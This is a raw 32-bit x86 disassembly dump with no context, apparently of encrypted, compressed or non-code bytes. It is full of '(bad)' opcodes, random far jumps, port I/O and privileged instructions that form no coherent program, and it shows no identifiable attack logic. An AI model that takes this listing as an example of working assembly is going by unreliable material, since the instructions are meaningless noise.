  411fe8:	push   edi
  411fe9:	dec    ebx
  411fea:	(bad)  
  411fec:	loopne 0x41204d
  411fee:	mov    ah,0x4
  411ff0:	out    0x6a,eax
  411ff2:	mov    ds:0xe5660a2b,al
  411ff7:	repnz cmc 
  411ff9:	and    ebp,DWORD PTR [edi+0x6c1417f0]
  411fff:	retf   0xfce7
  412002:	std    
  412003:	push   es
  412004:	test   al,0x8a
  412006:	rcl    DWORD PTR [esi],cl
  412008:	lahf   
  412009:	inc    ebx
  41200a:	mov    ch,0x50
  41200c:	imul   edx,DWORD PTR [edx],0x279354b6
  412012:	fild   QWORD PTR [edi]
  412014:	in     eax,0x58
  412016:	push   ds
  412017:	in     eax,dx
  412018:	ss pop esi
  41201a:	pop    esp
  41201b:	adc    al,0xa
  41201d:	pop    edx
  41201e:	mov    ebp,0xb79d89a5
  412023:	xor    eax,DWORD PTR [esi+0x3d3b3ec5]
  412029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41202a:	jnp    0x411fbe
  41202c:	xor    eax,0x8e1c559f
  412031:	mov    dl,cl
  412033:	(bad)  
  412035:	dec    ebx
  412036:	mov    bh,0x64
  412038:	jbe    0x412063
  41203a:	pop    ss
  41203b:	xchg   edi,eax
  41203c:	push   ebp
  41203d:	pusha  
  41203e:	pop    edx
  41203f:	in     eax,dx
  412040:	xchg   ebp,eax
  412041:	adc    BYTE PTR [ecx-0x54],ch
  412044:	sbb    edi,DWORD PTR [ecx+0x2281f921]
  41204a:	mov    dh,BYTE PTR [ecx+0x12]
  41204d:	sahf   
  41204e:	sti    
  41204f:	daa    
  412050:	ror    BYTE PTR [edi+ebx*8+0x6b],0x58
  412055:	dec    ecx
  412056:	aad    0x9
  412058:	inc    edi
  412059:	lods   eax,DWORD PTR ds:[esi]
  41205a:	jae    0x412002
  41205c:	xor    DWORD PTR [eax-0x4b],ebp
  41205f:	mov    esp,0x3d3cc4f6
  412064:	cmp    BYTE PTR [eax+0x53a05feb],ah
  41206a:	pop    esp
  41206b:	mov    esp,0xe2ff591e
  412070:	daa    
  412071:	mov    ah,0xab
  412073:	push   ecx
  412074:	jmp    0x8e1f:0xef232ba8
  41207b:	add    bh,BYTE PTR ds:[edi]
  41207e:	jbe    0x41206e
  412080:	xor    dl,BYTE PTR ds:0x7f9b4735
  412086:	mov    ah,0x44
  412088:	outs   dx,BYTE PTR ds:[esi]
  412089:	aam    0xfb
  41208b:	mov    ds:0x9bac6846,al
  412090:	sbb    ecx,esi
  412092:	sahf   
  412093:	jns    0x4120f5
  412095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412096:	dec    eax
  412097:	and    DWORD PTR [esi+0x16467cd2],edx
  41209d:	ins    BYTE PTR es:[edi],dx
  41209e:	mov    bl,0xe4
  4120a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120a1:	call   0xc981:0xa14118eb
  4120a8:	js     0x41210f
  4120aa:	outs   dx,DWORD PTR ds:[esi]
  4120ab:	adc    DWORD PTR gs:[edi],0x18fcd4bf
  4120b2:	cwde   
  4120b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120b4:	test   eax,0x6c7d48a7
  4120b9:	xchg   edi,eax
  4120ba:	mov    ebp,0xb989c6c4
  4120bf:	push   es
  4120c0:	call   0xe7b5da44
  4120c5:	xor    esp,DWORD PTR [ebp+0x57]
  4120c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120c9:	jbe    0x41205a
  4120cb:	lock sbb cl,dl
  4120ce:	test   esp,edx
  4120d0:	mov    al,ds:0x580ef8c
  4120d5:	ja     0x4120b1
  4120d7:	jmp    0x7b43f5d9
  4120dc:	xchg   ebp,eax
  4120dd:	mov    fs:0xca4843ec,eax
  4120e3:	clc    
  4120e4:	and    BYTE PTR [ecx],ch
  4120e6:	retf   
  4120e7:	rcr    DWORD PTR [ebp-0x4d18114d],1
  4120ed:	test   BYTE PTR [ebx+0x7f],cl
  4120f0:	adc    eax,0x84ec980c
  4120f5:	cmp    al,0x86
  4120f7:	out    0x1b,al
  4120f9:	jns    0x4120c0
  4120fb:	push   ss
  4120fc:	jae    0x41211c
  4120fe:	inc    ebx
  4120ff:	xchg   edi,eax
  412100:	sbb    ebx,DWORD PTR [esi-0x715214e5]
  412106:	inc    esp
  412107:	sub    DWORD PTR [esi],esp
  412109:	mov    eax,0xadc17d4d
  41210e:	mov    al,0xa4
  412110:	cmp    eax,DWORD PTR [esp+0x73b855fa]
  412117:	repz std 
  412119:	fstp   TBYTE PTR [esp+ecx*8]
  41211c:	and    ebx,DWORD PTR [ecx+0x75f1b345]
  412122:	adc    eax,0x2b9d6d8c
  412127:	bt     DWORD PTR [eax+0x20],ebx
  41212b:	or     DWORD PTR [ebx-0x18309989],esp
  412131:	imul   esi,DWORD PTR [esi-0x29],0x39
  412135:	das    
  412136:	mov    cl,0xd4
  412138:	ss cdq 
  41213a:	sbb    esp,DWORD PTR [edx-0xa2c59bf]
  412140:	push   es
  412141:	stos   BYTE PTR es:[edi],al
  412142:	mov    ss,WORD PTR [edx+eax*8+0x17]
  412146:	mov    edi,0xd7e2e354
  41214b:	sbb    ch,ah
  41214d:	xchg   ebx,eax
  41214e:	es in  eax,dx
  412150:	int3   
  412151:	ds jno 0x4120dd
  412154:	and    edi,DWORD PTR [ecx-0x3c]
  412157:	add    ch,dl
  412159:	std    
  41215a:	stc    
  41215b:	pop    ecx
  41215c:	inc    ebp
  41215d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41215e:	fwait
  41215f:	mov    esi,0x19ac9d93
  412164:	pop    ds
  412165:	popa   
  412166:	ds loop 0x41214d
  412169:	xlat   BYTE PTR ds:[ebx]
  41216a:	mov    cl,0x24
  41216c:	mov    edi,0xf5f81f7f
  412171:	push   ds
  412172:	adc    cl,ch
  412174:	jmp    0x4121b3
  412176:	aad    0x1f
  412178:	sti    
  412179:	pop    edx
  41217a:	div    DWORD PTR [eax]
  41217c:	and    ebp,ecx
  41217e:	dec    eax
  41217f:	push   edx
  412180:	inc    edi
  412181:	mov    dl,0x5f
  412183:	push   eax
  412184:	adc    eax,0xef06ac
  412189:	pop    ecx
  41218a:	mov    al,0x55
  41218c:	sbb    bh,BYTE PTR [ecx-0x4a]
  41218f:	cmp    al,0x18
  412191:	xchg   cx,ax
  412193:	or     eax,0x262bea50
  412198:	sub    DWORD PTR cs:[ecx],edx
  41219b:	push   esp
  41219c:	lods   eax,DWORD PTR ds:[esi]
  41219d:	mov    ebp,0x5993eb8e
  4121a2:	ins    DWORD PTR es:[edi],dx
  4121a3:	jmp    0x1cfc4305
  4121a8:	mov    esi,0x6f2b7b0
  4121ad:	jno    0x412200
  4121af:	shl    BYTE PTR [ebp+0x6f],cl
  4121b2:	jnp    0x4121d5
  4121b4:	std    
  4121b5:	push   ss
  4121b6:	(bad)  
  4121b7:	jmp    0x19631cb4
  4121bc:	and    bh,cl
  4121be:	pop    eax
  4121bf:	repz sub eax,0xf50f786b
  4121c5:	cmp    cl,BYTE PTR ds:0x525c5ff2
  4121cb:	mov    al,0x30
  4121cd:	test   eax,0x737689ff
  4121d2:	fs stos DWORD PTR es:[edi],eax
  4121d4:	sahf   
  4121d5:	push   edi
  4121d6:	mov    bh,0x2e
  4121d8:	out    dx,eax
  4121d9:	sar    BYTE PTR [ecx],0x70
  4121dc:	inc    ebp
  4121dd:	ror    DWORD PTR [esi+eiz*8-0x43],cl
  4121e1:	or     DWORD PTR [eax],0x9fe954b8
  4121e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121e8:	repz out dx,eax
  4121ea:	dec    edx
  4121eb:	add    ecx,0x66681d6c
  4121f1:	ins    BYTE PTR es:[edi],dx
  4121f2:	mov    dh,0x2a
  4121f4:	push   edi
  4121f5:	retf   
  4121f6:	xlat   BYTE PTR ds:[ebx]
  4121f7:	jle    0x41218e
  4121f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121fa:	pop    ds
  4121fb:	pop    esi
  4121fc:	add    DWORD PTR [edi],ebp
  4121fe:	inc    ebp
  4121ff:	iret   
  412200:	add    eax,0x14c59dd6
  412205:	push   ss
  412206:	sbb    BYTE PTR gs:0x497339e2,dl
  41220d:	sub    al,0x9a
  41220f:	jg     0x4121d8
  412211:	and    ch,dh
  412213:	lods   al,BYTE PTR ds:[esi]
  412214:	xchg   ebp,eax
  412215:	fcomp  DWORD PTR [esi-0x1c9c5ccf]
  41221b:	jle    0x412244
  41221d:	or     DWORD PTR [esp+edi*8],edx
  412220:	in     al,0x8e
  412222:	mov    edx,0xef18a18a
  412227:	dec    eax
  412228:	push   ebp
  412229:	and    eax,0x4868e974
  41222e:	mov    WORD PTR [edi],ds
  412230:	and    BYTE PTR [ecx],bl
  412232:	mov    ebp,0x26f54dce
  412237:	test   ecx,ecx
  412239:	mov    al,ds:0xbcd5f06b
  41223e:	sub    cl,BYTE PTR [edx-0x10f73200]
  412244:	inc    esp
  412245:	sti    
  412246:	mov    dh,0xb4
  412248:	adc    al,0xd7
  41224a:	leave  
  41224b:	mov    cl,0x5
  41224d:	jae    0x412263
  41224f:	hlt    
  412250:	sub    al,0x51
  412252:	sbb    BYTE PTR [ecx+0x2ab9a923],bl
  412258:	scas   al,BYTE PTR es:[edi]
  412259:	jmp    DWORD PTR [esp+edx*2-0x4c]
  41225d:	xchg   BYTE PTR ds:0x3b9c1805,bl
  412263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412264:	int    0x22
  412266:	xchg   esp,eax
  412267:	rcr    DWORD PTR [ecx+ebp*8],0x4c
  41226b:	stc    
  41226c:	mov    cl,0x9c
  41226e:	add    bh,BYTE PTR [ecx-0x72]
  412271:	mov    eax,ds:0xbe0bf0ab
  412276:	setl   dl
  412279:	cmc    
  41227a:	test   DWORD PTR [esi-0x6b463f0c],ebx
  412280:	inc    eax
  412281:	(bad)
  412284:	test   DWORD PTR [edi],ebx
  412286:	addr16 hlt 
  412288:	dec    edi
  412289:	xor    al,0x1e
  41228b:	bound  edx,QWORD PTR [ebp-0x77b0a117]
  412291:	aaa    
  412292:	ins    DWORD PTR es:[edi],dx
  412293:	xchg   ebx,eax
  412294:	push   ebx
  412295:	sbb    esi,DWORD PTR [ebp-0x76879b13]
  41229b:	inc    ebx
  41229c:	push   ebp
  41229d:	enter  0xe883,0x67
  4122a1:	cs cmp ebx,edx
  4122a4:	sbb    ecx,ebx
  4122a6:	test   BYTE PTR [esi+eiz*1+0x23],ch
  4122aa:	pop    edx
  4122ab:	adc    DWORD PTR [eax+0x17fd7ba6],ecx
  4122b1:	or     eax,0x5bd8ae38
  4122b6:	push   eax
  4122b7:	das    
  4122b8:	ja     0x4122df
  4122ba:	mov    esp,0xa04e41e4
  4122bf:	push   edi
  4122c0:	out    0x22,eax
  4122c2:	cs aad 0x36
  4122c5:	xchg   BYTE PTR [edx+edx*8+0x1c],al
  4122c9:	std    
  4122ca:	mov    ebx,0xc819169c
  4122cf:	repz push ss
  4122d1:	xor    DWORD PTR [edx-0x607256f7],edi
  4122d7:	dec    eax
  4122d8:	xor    al,0x41
  4122da:	or     edx,DWORD PTR [ebp+0x5f75122d]
  4122e0:	and    DWORD PTR [eax],edi
  4122e2:	jb     0x4122cf
  4122e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122e5:	pop    ebx
  4122e6:	call   0x43df973f
  4122eb:	or     eax,0xd6fba471
  4122f0:	push   cs
  4122f1:	fsubr  st,st(6)
  4122f3:	test   eax,0xf6479c19
  4122f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122f9:	scas   eax,DWORD PTR es:[edi]
  4122fa:	mov    ebp,0xcaecc1e4
  4122ff:	push   cs
  412300:	jne    0x412367
  412302:	in     eax,0xf0
  412304:	jl     0x4122fc
  412306:	out    dx,ax
  412308:	sbb    eax,0xb189dd79
  41230d:	dec    DWORD PTR [esi-0x345e7fd7]
  412313:	xlat   BYTE PTR ds:[ebx]
  412314:	cmp    al,0xc1
  412316:	xchg   esp,eax
  412317:	xchg   DWORD PTR [eax-0x50a6e2d4],ebx
  41231d:	hlt    
  41231e:	(bad)  
  41231f:	fs pop edi
  412321:	and    esi,ebx
  412323:	inc    ebp
  412324:	je     0x4122c1
  412326:	cmp    esi,ecx
  412328:	fcmovnbe st,st(3)
  41232a:	sub    BYTE PTR [edx+0x68],dl
  41232d:	sbb    bl,BYTE PTR [ebx]
  41232f:	ins    BYTE PTR es:[edi],dx
  412330:	loop   0x4122ef
  412332:	mov    esi,0x894291c4
  412337:	(bad)  
  412338:	mov    ch,0xbb
  41233a:	ins    DWORD PTR es:[edi],dx
  41233b:	out    dx,eax
  41233c:	xchg   ebp,eax
  41233d:	jecxz  0x412398
  41233f:	iret   
  412340:	and    ecx,ebp
  412342:	sbb    BYTE PTR [ebx],ah
  412344:	xchg   BYTE PTR [ecx-0x7a],bl
  412347:	jae    0x41236c
  412349:	mov    al,ds:0xb8a9b4fb
  41234e:	icebp  
  41234f:	aaa    
  412350:	lock xor BYTE PTR [eax+0x8],ah
  412354:	xchg   ecx,eax
  412355:	imul   esi,DWORD PTR [edx-0x77f6495c],0xffffffe8
  41235c:	add    eax,0x348c2b9b
  412361:	ss (bad) 
  412363:	repz je 0x4123a6
  412366:	jbe    0x4123e0
  412368:	fsub   DWORD PTR [edx+0x110d93b]
  41236e:	mov    bh,0xda
  412370:	loop   0x4123d7
  412372:	pop    ds
  412373:	adc    DWORD PTR [ebx],ebx
  412375:	inc    ecx
  412376:	dec    ebx
  412377:	rol    BYTE PTR [esi+0x3c],cl
  41237a:	daa    
  41237b:	or     al,0x24
  41237d:	jmp    0x640f5770
  412382:	mov    bh,0xc6
  412384:	sbb    BYTE PTR [eax-0x448f1395],ah
  41238a:	inc    ecx
  41238b:	mov    BYTE PTR [ecx],bl
  41238d:	add    dl,BYTE PTR [ecx]
  41238f:	add    al,0x6c
  412391:	inc    eax
  412392:	mov    eax,0x92919334
  412397:	js     0x4123ae
  412399:	cs mov bh,0xef
  41239c:	in     al,0xea
  41239e:	inc    esi
  41239f:	mov    dh,0x15
  4123a1:	retf   0x7027
  4123a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123a5:	mov    al,0xd
  4123a7:	and    eax,0x6975bcd6
  4123ac:	fisubr DWORD PTR [eax+0x4aa8219b]
  4123b2:	js     0x41236a
  4123b4:	cmc    
  4123b5:	clc    
  4123b6:	mov    bh,0xc
  4123b8:	sub    BYTE PTR [ebx+esi*2-0x63e4e7c8],bl
  4123bf:	mov    es,WORD PTR [esi]
  4123c1:	and    BYTE PTR [edi-0x72ee76d7],al
  4123c7:	xchg   ebp,eax
  4123c8:	mov    ds,WORD PTR [ebx-0x18]
  4123cb:	je     0x4123f2
  4123cd:	push   ecx
  4123ce:	lock cs std 
  4123d1:	test   eax,0x9ff15e22
  4123d6:	xor    eax,0xfb4d0da6
  4123db:	icebp  
  4123dc:	dec    ebp
  4123dd:	repz cmp eax,DWORD PTR [edx+0x0]
  4123e1:	or     DWORD PTR [eax-0x9ba9aa9],0xba7e67eb
  4123eb:	sub    eax,0xd86bb99e
  4123f0:	shr    bl,1
  4123f2:	fmul   DWORD PTR [eax]
  4123f4:	mov    cl,0x6f
  4123f6:	(bad)  
  4123f7:	div    DWORD PTR [esi]
  4123f9:	(bad)  
  4123fa:	mov    edi,0x474d5eec
  4123ff:	cs pop es
  412401:	and    DWORD PTR [ebx-0x3152985a],edx
  412407:	or     BYTE PTR [edx+0x592b075],ah
  41240d:	xchg   esi,eax
  41240e:	stos   BYTE PTR es:[edi],al
  41240f:	jmp    0xdaa526ef
  412414:	(bad)  
  412416:	cmp    dh,BYTE PTR [ebx+0xd776d28]
  41241c:	push   esi
  41241d:	lds    ebx,FWORD PTR [esi+eiz*1]
  412420:	je     0x4123c5
  412422:	mov    ebx,0xc3da2fab
  412427:	xchg   BYTE PTR [edi],dl
  412429:	and    esp,DWORD PTR [edx+0x56b91f7b]
  41242f:	push   esp
  412430:	sti    
  412431:	sbb    eax,DWORD PTR [ebp+0xb]
  412434:	cmp    ch,BYTE PTR [ecx+0x285df962]
  41243a:	sahf   
  41243b:	sub    eax,0xeadbb696
  412440:	int3   
  412441:	dec    ebx
  412442:	mov    esp,0xd86150a2
  412447:	or     eax,0xbeea4920
  41244c:	dec    ebx
  41244d:	mov    ch,BYTE PTR [edi-0x1f]
  412450:	mov    DWORD PTR [eax-0x578200c5],ebp
  412456:	xor    cl,dh
  412458:	sub    BYTE PTR [ecx-0x26dfa884],bh
  41245e:	ds xor al,0x9f
  412461:	popa   
  412462:	adc    al,0x1c
  412464:	es call 0x5987:0xcc80370b
  41246c:	mov    edi,0xaccc9c08
  412471:	mov    ebp,0xbcf964bc
  412476:	jbe    0x4124e1
  412478:	cmc    
  412479:	lods   eax,DWORD PTR ds:[esi]
  41247a:	hlt    
  41247b:	out    dx,eax
  41247c:	xor    DWORD PTR [ebp-0x45161cd6],ebp
  412482:	jo     0x4124be
  412484:	pop    ss
  412485:	mov    cl,0xfc
  412487:	xchg   ebx,eax
  412488:	mov    ch,0x1d
  41248a:	mov    ebx,0x113d21ce
  41248f:	rep stos BYTE PTR es:[edi],al
  412491:	loope  0x41243b
  412493:	(bad)  
  412494:	and    dl,BYTE PTR [ebp+0x7640d4b3]
  41249a:	call   0x43ee:0x4247459c
  4124a1:	jg     0x4124f8
  4124a3:	data16 test al,0x60
  4124a6:	in     eax,0x79
  4124a8:	dec    eax
  4124a9:	(bad)  
  4124aa:	mov    al,ds:0xacb31705
  4124af:	repnz fdiv QWORD PTR [eax+0xf]
  4124b3:	imul   ebx,DWORD PTR [edx-0x30],0x2e2986eb
  4124ba:	loope  0x4124d5
  4124bc:	xor    esi,DWORD PTR [ebp-0x17]
  4124bf:	aam    0xb2
  4124c1:	jge    0x412506
  4124c3:	outs   dx,DWORD PTR ds:[esi]
  4124c4:	ret    
  4124c5:	push   ecx
  4124c6:	and    ebp,eax
  4124c8:	push   ss
  4124c9:	cdq    
  4124ca:	out    0xe1,eax
  4124cc:	das    
  4124cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124ce:	mov    ebx,0x165cf7ae
  4124d3:	rcl    BYTE PTR [edi+0x75403c07],0x22
  4124da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124db:	mov    ch,0x3b
  4124dd:	inc    ebx
  4124de:	push   ds
  4124df:	out    dx,eax
  4124e0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4124e2:	fwait
  4124e3:	xchg   esi,eax
  4124e4:	test   al,0x9c
  4124e6:	sahf   
  4124e7:	push   eax
  4124e8:	outs   dx,BYTE PTR ds:[esi]
  4124e9:	mov    eax,edi
  4124eb:	test   BYTE PTR [eax+ebp*4],0x45
  4124ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124f0:	add    eax,0x3f3539a
  4124f5:	pushf  
  4124f6:	pop    ebx
  4124f7:	xor    ah,cl
  4124f9:	xlat   BYTE PTR ds:[ebx]
  4124fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124fb:	lds    eax,FWORD PTR [ebx]
  4124fd:	push   edx
  4124fe:	sti    
  4124ff:	dec    eax
  412500:	outs   dx,WORD PTR ds:[esi]
  412502:	jae    0x41254a
  412504:	jg     0x4124f4
  412506:	mov    ch,0x68
  412508:	push   edx
  412509:	sbb    ah,bl
  41250b:	inc    edi
  41250c:	out    dx,al
  41250d:	mov    edx,0x926c5962
  412512:	sbb    dh,ah
  412514:	push   ds
  412515:	imul   edx,DWORD PTR [ebp-0x58bc8e2],0xfbc0ab57
  41251f:	pop    esp
  412520:	mov    ch,0xc1
  412522:	inc    edx
  412523:	sbb    BYTE PTR [ecx],ah
  412525:	test   DWORD PTR [edx-0x54],edi
  412528:	push   ebx
  412529:	cmp    DWORD PTR ds:0x219536c,ebx
  41252f:	out    dx,al
  412530:	mov    edi,0x75f442d7
  412535:	mov    DWORD PTR [ebp-0x14],esp
  412538:	cdq    
  412539:	or     al,0x19
  41253b:	sbb    DWORD PTR [eax],ebx
  41253d:	mov    DWORD PTR [ecx],ecx
  41253f:	pop    esp
  412540:	lds    ebx,FWORD PTR [eax]
  412542:	jp     0x412557
  412544:	xchg   DWORD PTR [ebx+ecx*2-0x24a6fded],ebx
  41254b:	cli    
  41254c:	pop    eax
  41254d:	dec    ebp
  41254e:	adc    BYTE PTR [edi],ch
  412550:	xor    ah,BYTE PTR [ecx-0x4e]
  412553:	les    eax,FWORD PTR [ebx+0x45564a7c]
  412559:	mov    al,ds:0xadeae502
  41255e:	stos   BYTE PTR es:[edi],al
  41255f:	hlt    
  412560:	dec    ecx
  412561:	cdq    
  412562:	inc    ecx
  412563:	lahf   
  412564:	and    al,0xe8
  412566:	push   esi
  412567:	aas    
  412568:	loop   0x412516
  41256a:	cdq    
  41256b:	sbb    ebx,ebp
  41256d:	fadd   DWORD PTR [ecx+0x23]
  412570:	jne    0x412573
  412572:	sub    edx,0x14
  412575:	aad    0xed
  412577:	xchg   esp,eax
  412578:	sbb    bh,BYTE PTR [ecx]
  41257a:	repnz popf 
  41257c:	cmp    BYTE PTR [edi-0x39],al
  41257f:	ror    DWORD PTR [esi-0x5b],1
  412582:	fwait
  412583:	or     al,BYTE PTR [ebp-0x42]
  412586:	jg     0x4125c7
  412588:	fcom   DWORD PTR ds:0x68759d33
  41258e:	sti    
  41258f:	dec    ebx
  412590:	cdq    
  412591:	mov    eax,0xa6902d70
  412596:	mov    ch,0xb4
  412598:	pop    esp
  412599:	stc    
  41259a:	xor    BYTE PTR [edi-0x152f6cbb],bh
  4125a0:	add    DWORD PTR [esi-0x36e9eacb],edi
  4125a6:	jno    0x4125df
  4125a8:	mov    al,ds:0xf0bb2726
  4125ad:	mov    al,ds:0x9c43269b
  4125b2:	or     DWORD PTR [ecx],edi
  4125b4:	mov    esp,0xe5e2c58c
  4125b9:	mov    esi,0x151ba502
  4125be:	adc    eax,0xebb76a0e
  4125c3:	xchg   ebp,eax
  4125c4:	mov    esi,edi
  4125c6:	cmp    DWORD PTR [ecx+eax*4-0x65],ebx
  4125ca:	rcl    BYTE PTR [edx+esi*1+0x3b11e419],cl
  4125d1:	fisub  DWORD PTR [ebx+0x5e555903]
  4125d7:	push   0xe6a54af5
  4125dc:	repnz outs dx,DWORD PTR ds:[esi]
  4125de:	and    eax,0x1f792557
  4125e3:	fsubr  QWORD PTR [edx-0x66]
  4125e6:	fucomp st(5)
  4125e8:	sahf   
  4125e9:	fwait
  4125ea:	pop    ebx
  4125eb:	pop    es
  4125ec:	out    dx,eax
  4125ed:	jnp    0x41261b
  4125ef:	fwait
  4125f0:	sub    BYTE PTR ds:0xe7c9dd11,al
  4125f6:	mov    bh,0xd4
  4125f8:	into   
  4125f9:	inc    ecx
  4125fa:	gs pusha 
  4125fc:	aas    
  4125fd:	lahf   
  4125fe:	aad    0x6e
  412600:	or     DWORD PTR [esi-0x32],esp
  412603:	ins    BYTE PTR es:[edi],dx
  412604:	pop    esi
  412605:	test   al,0x2b
  412607:	addr16 add eax,0x1f5a3ff2
  41260d:	stc    
  41260e:	dec    esi
  41260f:	je     0x412611
  412611:	js     0x4125c3
  412613:	jmp    0x3a3a:0x337ba731
  41261a:	inc    edx
  41261b:	rcr    DWORD PTR ds:0x341f965c,cl
  412621:	cdq    
  412622:	int    0x4b
  412624:	adc    BYTE PTR [eax+0x67d7b88c],bl
  41262a:	dec    ebx
  41262b:	add    DWORD PTR [ebp-0x7b0344f5],0x25938774
  412635:	sbb    ecx,ebx
  412637:	pop    ecx
  412638:	popw   es
  41263a:	or     al,0x95
  41263c:	or     BYTE PTR fs:[ebx],cl
  41263f:	and    esi,esp
  412641:	(bad)
  412645:	sbb    DWORD PTR [ebp+0x2c],ecx
  412648:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41264a:	lahf   
  41264b:	pushf  
  41264c:	test   BYTE PTR [ebx+0x2f],0xd5
  412650:	sbb    eax,0xe9eb70b6
  412655:	sub    DWORD PTR [ebx+0x6d],edx
  412658:	jl     0x412663
  41265a:	in     al,dx
  41265b:	sti    
  41265c:	aaa    
  41265d:	inc    ebp
  41265e:	loop   0x4126dd
  412660:	jp     0x4125e5
  412662:	mov    esp,0x7a391bef
  412667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412668:	xor    eax,0xdb51f9e7
  41266d:	fwait
  41266e:	cmp    ecx,edx
  412670:	call   0x644b:0x78e39050
  412677:	fs iret 
  412679:	fnstenv [ebp-0x2e7a89cc]
  41267f:	jle    0x4126b6
  412681:	fisttp QWORD PTR [edx-0x4eab7113]
  412687:	jne    0x41261b
  412689:	imul   edi,DWORD PTR [ebp+0x5b86ed01],0xbe09f14b
  412693:	out    dx,eax
  412694:	mov    ebx,DWORD PTR [edx-0x1c26937d]
  41269a:	mov    esp,0xeeafae4
  41269f:	add    al,0xd5
  4126a1:	call   0x87e6:0xc637b4ba
  4126a8:	(bad)  
  4126a9:	gs pop es
  4126ab:	adc    bl,BYTE PTR [eax]
  4126ad:	iret   
  4126ae:	stos   BYTE PTR es:[edi],al
  4126af:	es int 0xf3
  4126b2:	mov    bh,0xe8
  4126b4:	dec    ebp
  4126b5:	push   ecx
  4126b6:	mov    ch,0x84
  4126b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126b9:	mov    al,ds:0x30a501f0
  4126be:	or     esi,edx
  4126c0:	pop    esp
  4126c1:	and    BYTE PTR [eax+0x4d9a09df],0xe7
  4126c8:	fwait
  4126c9:	pushf  
  4126ca:	popf   
  4126cb:	jno    0x4126c8
  4126cd:	and    al,0xf7
  4126cf:	xchg   edx,eax
  4126d0:	jne    0x4126ee
  4126d2:	push   ebx
  4126d3:	out    dx,al
  4126d4:	jo     0x4126e0
  4126d6:	retf   
  4126d7:	sub    dl,BYTE PTR [ecx]
  4126d9:	stos   BYTE PTR es:[edi],al
  4126da:	xchg   edx,eax
  4126db:	cmp    cl,BYTE PTR [edi-0x62]
  4126de:	add    eax,DWORD PTR [ebx+0x1c]
  4126e1:	das    
  4126e2:	cmp    ah,ah
  4126e4:	xchg   esp,eax
  4126e5:	sar    ebx,cl
  4126e7:	or     dl,BYTE PTR [esi]
  4126e9:	add    al,0xa6
  4126eb:	mul    BYTE PTR [eax]
  4126ed:	xor    esp,DWORD PTR ds:0x1c20a711
  4126f3:	sub    ah,BYTE PTR ds:0x1514b9ea
  4126f9:	lds    esp,FWORD PTR [edi+edi*1+0x30fc17e5]
  412700:	mov    ch,0x62
  412702:	outs   dx,BYTE PTR ds:[esi]
  412703:	jae    0x41273d
  412705:	dec    ebp
  412706:	fsubr  st,st(2)
  412708:	and    ch,BYTE PTR [ecx+0x2f]
  41270b:	cli    
  41270c:	cmp    DWORD PTR [ecx],eax
  41270e:	pop    ecx
  41270f:	aad    0x46
  412711:	mov    ds:0xd073b6eb,eax
  412716:	out    dx,al
  412717:	in     eax,dx
  412718:	inc    edx
  412719:	mov    ebp,0x9afb09aa
  41271e:	mov    dl,0x54
  412720:	jnp    0x412701
  412722:	push   cs
  412723:	rol    DWORD PTR [ebp-0x46],cl
  412726:	sub    ecx,DWORD PTR [esi]
  412728:	add    edi,0xed182843
  41272e:	(bad)  
  412730:	adc    ebp,DWORD PTR [ebx+0x5d]
  412733:	fstp   QWORD PTR ds:0x924a62d5
  412739:	call   0xe9bf:0x56b5e52f
  412740:	mov    eax,ds:0x2a607225
  412745:	mov    ecx,0xdaea42ff
  41274a:	test   DWORD PTR [eax-0x581ef897],0x9abb9fef
  412754:	xor    DWORD PTR [ebx+0x9],ebx
  412757:	jno    0x412780
  412759:	inc    ecx
  41275a:	cdq    
  41275b:	pop    esi
  41275c:	mov    dh,0x3f
  41275e:	dec    edx
  41275f:	lds    eax,FWORD PTR ds:0xa7e5eec3
  412765:	and    cl,BYTE PTR [edi]
  412767:	lea    esp,ds:0x9aa3ffd9
  41276d:	adc    al,0xb8
  41276f:	dec    eax
  412770:	sbb    bh,cl
  412772:	call   0xb353:0xc540ad5b
  412779:	or     eax,0xa3e5225d
  41277e:	retf   
  41277f:	outs   dx,DWORD PTR ds:[esi]
  412780:	ja     0x412761
  412782:	and    edi,DWORD PTR [esi+0x6939101b]
  412788:	adc    BYTE PTR es:[eax+0x26],bh
  41278c:	mov    DWORD PTR [ebx-0x4a],ebx
  41278f:	and    al,0x95
  412791:	pushf  
  412792:	pop    ebx
  412793:	dec    ecx
  412794:	imul   ebp,ebp,0xffffffe1
  412797:	jmp    0xd923:0xf1def076
  41279e:	push   eax
  41279f:	xor    esp,eax
  4127a1:	aam    0x64
  4127a3:	fs push 0x2446615e
  4127a9:	fldcw  WORD PTR [ebp+0x7d115b5d]
  4127af:	push   esi
  4127b0:	and    al,0x19
  4127b2:	in     eax,0xf5
  4127b4:	xchg   cl,dh
  4127b6:	popa   
  4127b7:	jae    0x4127ca
  4127b9:	xchg   ebp,ebx
  4127bb:	lahf   
  4127bc:	sub    al,0x99
  4127be:	fwait
  4127bf:	outs   dx,DWORD PTR ds:[esi]
  4127c0:	jl     0x41277e
  4127c2:	repz loopne 0x41276a
  4127c5:	mov    dl,0x57
  4127c7:	jae    0x412811
  4127c9:	mov    eax,0xd320a52e
  4127ce:	cdq    
  4127cf:	mov    cl,0x8f
  4127d1:	call   0x1336:0x432a5e8b
  4127d8:	cmp    al,0xdf
  4127da:	sub    DWORD PTR [ebx+0x14b814cd],0xa15279c7
  4127e4:	jbe    0x4127be
  4127e6:	rcl    dh,0x1a
